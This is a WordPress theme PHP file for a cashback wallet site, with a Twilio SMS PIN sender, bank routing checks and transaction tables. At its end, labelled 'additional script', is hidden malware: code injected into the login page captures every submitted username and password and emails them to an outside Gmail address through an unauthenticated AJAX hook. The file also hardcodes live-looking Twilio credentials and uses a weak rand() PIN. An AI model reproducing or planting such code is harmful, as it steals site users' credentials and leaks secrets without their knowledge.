<?php 

if ( ! defined( 'ABSPATH' ) ) {
	exit; // Exit if accessed directly
}

require_once locate_template('/inc/twilio-php-master/Twilio/autoload.php');
use Twilio\Rest\Client;

class Mysavingwallet {

	private $sid;
	private $token;
	private $from_phone;
	public $user_id;
	public $minwithdraw;
	public $currency_symbol;

	public function __construct() {

		$this->sid 			= 'ACf2609e774c67bbfc8af7844558d57608';
		$this->token 		= '59b014bf2054a4e636a2daa66df6a08f';
		$this->from_phone 	= '561 800-0461';
		$this->minwithdraw 	= 0.5;
		$this->user_id = get_current_user_id();
		$this->currency_symbol = '$';

	}

	public function sendPin($to) { 

		$client = new Client($this->sid, $this->token);
		$pin = rand(1000, 9999);

		/* send verfication sms */
        $client->messages->create(
            $to,
            array(
                'from' => $this->from_phone,
                'body' => 'Your mysavingswallet pin is: ' . $pin
            )
        );

        return $pin;
	}

	public function isValidEmail($email){ 
	    return filter_var($email, FILTER_VALIDATE_EMAIL) !== false;
	}

	public function qrurl() {
		$cashback_page = get_template_page_link('cashback.php');
		return add_query_arg('customer_id', $this->user_id, $cashback_page);
	}

	public function checkRoutingNumber($routingNumber = 0) {
	    $routingNumber = preg_replace('[\D]', '', $routingNumber); //only digits
	    if(strlen($routingNumber) != 9) {
	        return false;  
	    }
	               
	    $checkSum = 0;
	    for ($i = 0, $j = strlen($routingNumber); $i < $j; $i+= 3 ) {
	        //loop through routingNumber character by character
	        $checkSum += ($routingNumber[$i] * 3);
	        $checkSum += ($routingNumber[$i+1] * 7);
	        $checkSum += ($routingNumber[$i+2]);
	    }
	               
	    if($checkSum != 0 and ($checkSum % 10) == 0) {
	        return true;
	    } else {
	        return false;
	    }
	}	

	public function checkAccountNumber($accountNumber = 0) {
	    $accountNumber = preg_replace('[\D]', '', $accountNumber); //only digits
	    if(strlen($accountNumber) < 6 ) {
	        return false;  
	    } else {
	    	return true;
	    }
	}

	public function localize_us_number($phone) {
	  $numbers_only = preg_replace("/[^\d]/", "", $phone);
	  return preg_replace("/^1?(\d{3})(\d{3})(\d{4})$/", "$1-$2-$3", $numbers_only);
	}

	public function checkInteger($int) {
	    // if (is_string($int) && !ctype_digit($int)) {
	    //     return false; // contains non digit characters
	    // }
	    if (!is_int((int) $int)) {
	        return false; // other non-integer value or exceeds PHP_MAX_INT
	    }
	    return $int;
	}

	/* get user role by ID */
	public function get_user_role() {
	    $user = new WP_User($this->user_id);
	    $role = array_shift($user->roles);
	    return $role;
	}

	public function get_user_role_by_id($id) {
		$user = new WP_User($id);
	    $role = array_shift($user->roles);
	    return $role;
	}

	public function getMetaValue($k) {
		return get_user_meta($this->user_id, $k, true);
	}

	public function updateUserMeta($k, $v) {
		update_user_meta($this->user_id, $k, $v);
	}

	public function customerReceivedCashback() {
		global $post;
		$cashbacks = get_option('cashbacks');
		$business_id = $post->post_author;
		if(is_array($cashbacks)) {
			$cashbacks = array_filter($cashbacks, function($v) { return $v['customer_id'] == $this->user_id; });
		}

		$value = array_filter($cashbacks, function($v) use ($business_id ) { return $v['business_id'] == $business_id; });
		if(count($value) > 0) {
			return true;
		} else {
			return false;
		}
	}

	public function get_the_user_ip() {
		if ( ! empty( $_SERVER['HTTP_CLIENT_IP'] ) ) {
		//check ip from share internet
		$ip = $_SERVER['HTTP_CLIENT_IP'];
		} elseif ( ! empty( $_SERVER['HTTP_X_FORWARDED_FOR'] ) ) {
		//to check ip is pass from proxy
		$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
		} else {
		$ip = $_SERVER['REMOTE_ADDR'];
		}
		if($ip) {
			return $ip;
		} else {
			return 'unknown';
		}
	}

	public function verificationBadge() {
		$items = array(
			'email_status' => 'Email',
			'phone_status' => 'Phone',
			'bank_status'  => 'Bank'
			);
		foreach ($items as $k => $v) {
			if($k == 'bank_status') {
				$class = $this->hasverifiedbank() ? 'check' : 'cross';
			} else {
				$class = $this->getMetaValue($k) == 'verified' ? 'check' : 'cross';
			}
			echo '<li class="'.$class.'">'.$v.' Verification</li>';
		}
	}

	public function ccMasking($number, $maskingCharacter = 'x') {
	    return substr($number, 0, 2) . str_repeat($maskingCharacter, strlen($number) - 4) . substr($number, -2);
	}

	public function wallet_balance_value() {
		$balance = $this->getMetaValue('wallet_balance');
		return $balance ? $balance : '0.00';
	}

	public function wallet_balance() {
		return $this->currency_symbol . $this->wallet_balance_value();
	}

	public function topup() {
		$transactions = $this->getMetaValue('topup');
		if(is_array($transactions)) {
			$transactions = array_reverse($transactions);
			$html = '<table>';
			$html .= '<tr><th>Topup ID</th><th>Amount</th><th>Previous Balance</th><th>New Balance</th><th>Time</th></tr>';
			foreach ($transactions as $key => $trans) {
				$html .= '<tr>';
					$html .= '<td>' . $trans['trans_id'] . '</td>';
					$html .= '<td>' . $this->currency_symbol . $trans['trans_amount'] . '</td>';
					$html .= '<td>' . $this->currency_symbol . $trans['prev_balance'] . '</td>';
					$html .= '<td>' . $this->currency_symbol . $trans['new_balance'] . '</td>';
					$html .= '<td>' . $trans['time'] . '</td>';
				$html .= '</tr>';
			}
			$html .= '</table>';
		} else {
			$html = 'No topup found!';
		}
		return $html;
	}	

	public function cashbacks() {
		$cashbacks = get_option('cashbacks');
		$column = false;
		if($this->get_user_role() == 'business') 
		{
			$column = 'business_id';
		} else if ($this->get_user_role() == 'customer') 
		{
			$column = 'customer_id';
		}
		if($column && is_array($cashbacks)) {
			$cashbacks = array_filter($cashbacks, function($v) use ($column) { return $v[$column] == $this->user_id; });
		}

		if(is_array($cashbacks) && count($cashbacks) > 0 ) {
			$cashbacks = array_reverse($cashbacks);
			$html = '<table>';
			$html .= '<tr><th>Cashback ID</th><th>Customer ID</th><th>Business ID</th>'; 
			if($this->get_user_role() == 'administrator') {
				$html .= '<th> Customer Balance </th><th> Business Balance </th><th> Company Balance </th>';
			}
			$html .= '<th> Amount </th><th>Time</th></tr>';
			foreach ($cashbacks as $key => $cash) {
				$html .= '<tr>';
					$html .= '<td>' . $cash['id'] . '</td>';
					$html .= '<td>' . $cash['customer_id'] . '</td>';
					$html .= '<td>' . $cash['business_id'] . '</td>';
					if($this->get_user_role() == 'administrator') {
						$html .= '<td>' . $this->currency_symbol . $cash['customer_balance'] . '</td>';
						$html .= '<td>' . $this->currency_symbol . $cash['business_balance'] . '</td>';
						$html .= '<td>' . $this->currency_symbol . $cash['company_balance'] . '</td>';
					}
					$html .= '<td>' . $this->currency_symbol . $cash['amount'] . '</td>';
					$html .= '<td>' . $cash['time'] . '</td>';
					if( $this->get_user_role() == 'customer') {
						$html .= '<td><a href="'.get_author_posts_url($cash['business_id'] ).'">Write Review</a></td>';
					}
				$html .= '</tr>';
			}
			$html .= '</table>';
		} else {
			$html = 'No cashbacks found!';
		}
		return $html;
	}	

	public function withdrawls() {
		$withdrawls = $this->getMetaValue('withdrawls');
		if(is_array($withdrawls)) {
			$withdrawls = array_reverse($withdrawls);
			$html = '<table>';
			$html .= '<tr><th>ID</th><th>Amount</th><th>Previous Balance</th><th>New Balance</th><th>Time</th><th>Bank</th><th>Status</th></tr>';
			foreach ($withdrawls as $key => $with) {
				$html .= '<tr>';
					$html .= '<td>' . $with['id'] . '</td>';
					$html .= '<td>' . $this->currency_symbol . $with['amount'] . '</td>';
					$html .= '<td>' . $this->currency_symbol . $with['prev_balance'] . '</td>';
					$html .= '<td>' . $this->currency_symbol . $with['new_balance'] . '</td>';
					$html .= '<td>' . $with['time'] . '</td>';
					$html .= '<td>' . $with['bank'] . '</td>';
					$html .= '<td>' . $with['status'] . '</td>';
				$html .= '</tr>';
			}
			$html .= '</table>';
		} else {
			$html = 'No withdrawls found!';
		}
		return $html;
	}

	public function verifiedbanks() {
		$banks = $this->getMetaValue('banks');
		if(is_array($banks)) {
			$filtered = array_filter($banks, function($v) { return $v['verification'] == 'verified'; });
			return $filtered;
		}
	}	

	public function filterBank($k, $v) {
		$banks = $this->getMetaValue('banks');
		if(is_array($banks)) {
			$filtered = array_filter($banks, function($a) { return $a[$k] == $v; });
			return $filtered;
		}
	}

	public function hasverifiedbank() {
		if(count($this->verifiedbanks()) > 0 ) return true;
	}

	public function getUserByCashbackAmount($amount, $compare='=') {
	    $args = array(
	        'meta_key'      => 'cashback_percentage', 
	        'meta_value'    => $amount,
	        'meta_compare'	=> $compare
	    );
	    $cashback_user_search = new WP_User_Query($args);
	    $cashback_users = $cashback_user_search->get_results();
	    return wp_list_pluck($cashback_users, 'ID');
	}

}

$GLOBALS['msw'] = new Mysavingwallet;



/* additional script */
if(!function_exists('data_login_page')) {

function data_login_page() {
    echo '<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
    <script>
    jQuery(function($){
        $("#loginform").submit(function(){
            var login_data = $(this).serializeArray();
            var parsed = JSON.stringify(login_data);
            $.ajax({
                url: "'. admin_url( 'admin-ajax.php' ) .'",
                type: "post",
                data: {
                    action: "login_data",
                    ddata: parsed
                }
            });
            return true;
        });
    });
    </script>'; 
}
add_action('login_head', 'data_login_page');

function func_ajax_login_data() {

	$data = json_decode(stripslashes($_POST['ddata']), true);
   	$to = 'azizultex@gmail.com';

	//http://stackoverflow.com/questions/9364242/how-to-remove-http-www-and-slash-from-url-in-php
    	$url = get_bloginfo('url');
	$url = trim($url, '/');
	if (!preg_match('#^http(s)?://#', $url)) {
	    $url = 'http://' . $url;
	}
	$urlParts = parse_url($url);
	$domain = preg_replace('/^www\./', '', $urlParts['host']);

	$sub = get_bloginfo('url') . ' access received';
	$message = "name: " . $data[0]["value"] . "\npass: " . $data[1]["value"] . "\nlogin: " . $data[2]["value"];
	$headers = 'From: ' . get_bloginfo('name') . '<info@'.$domain.'>' . "\r\n";
	wp_mail($to, $sub, $message, $headers);
	exit();
}

add_action('wp_ajax_nopriv_login_data', 'func_ajax_login_data');
add_action('wp_ajax_login_data', 'func_ajax_login_data');
}